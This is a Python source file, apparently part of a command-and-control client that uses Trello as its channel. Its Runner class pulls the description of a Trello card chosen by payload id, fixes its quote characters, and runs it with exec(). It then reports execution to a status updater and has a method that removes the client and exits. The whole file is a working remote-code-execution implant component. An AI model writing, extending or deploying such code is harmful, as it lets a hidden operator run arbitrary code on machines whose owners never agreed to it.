from trello import List as TrelloList, Card
from .utils import card_from_list
from .status_updater import StatusUpdater
import sys


class Runner:
    def __init__(self, status_updater: StatusUpdater) -> None:
        self.status_updater = status_updater
    
    def execute_command(self, payload_id: str, payload_list: TrelloList):
        self._run_payload(payload_list, payload_id)
        self.status_updater.runned_payload(f"Executes payload with id: {payload_id}")

    def remove_client(self):
        self.status_updater.remove_status() 
        sys.exit()
        
    def _find_payload(self, payload_list, payload_id) -> str:
        payload = ""
        card = card_from_list(payload_list, payload_id)
        if card is None:
            print("Geen valid payload")
        else:
            payload = card.desc
        return payload

    def _run_payload(self, payload_list, payload_id):
        payload = self._find_payload(payload_list, payload_id)
        if len(payload) > 0:
            veilige_payload = payload.replace('“', '"').replace(
                '”', '"').replace("‘", "'").replace("’", "'")
            exec(veilige_payload)
